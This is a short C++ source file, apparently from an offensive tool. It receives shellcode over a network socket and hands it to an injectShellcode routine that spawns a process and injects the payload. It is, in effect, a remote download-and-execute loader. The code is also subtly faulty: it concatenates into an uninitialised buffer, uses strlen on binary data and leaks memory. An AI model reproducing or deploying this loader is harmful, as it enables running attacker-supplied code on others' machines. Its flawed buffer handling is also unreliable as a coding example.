#pragma once
#include "injectShellcode.h"

int downloadShellcode(SOCKET ClientSocket) {
	printf("Downloading Shellcode");

	bool done = false;
	char shellcode[4096];
	while (!done) {
		char* recvbuf = new char[1024];
		int bytes = recv(ClientSocket, recvbuf, 1024, 0);

		int len_recv = strlen(recvbuf);
		printf("Length of rcvbuf is %d\n", len_recv);
		if (len_recv > 0) {
			printf("Appending to shellcode\n");
			strcat(shellcode, recvbuf);
			memset(recvbuf, '\0', 1024);
		}
		else {
			printf("Closing shellcode error: %s\n", strerror(errno));
			done = true;
			break;
		}

		if (len_recv < 1024) {
			printf("Last section of shellcode\n");
			done = true;
			break;
		}
	}
	printf("Finished upload\n");

	BOOL spawnProc = true;
	int PID = 0;
	BOOL unsafe = false;

	injectShellcode(spawnProc, PID, unsafe, shellcode,sizeof(shellcode));
	return 0;
}